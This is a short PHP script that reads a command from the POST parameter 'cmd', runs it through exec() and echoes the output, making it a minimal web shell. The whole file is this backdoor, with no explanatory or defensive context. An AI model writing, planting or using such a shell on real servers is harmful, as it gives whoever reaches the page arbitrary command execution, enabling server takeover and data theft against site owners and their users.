<?php
function execute($com)
{
	if (!empty($com))
	{
		if(function_exists('exec'))
		{
			exec($com,$arr);
			echo implode('',$arr);
		}
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>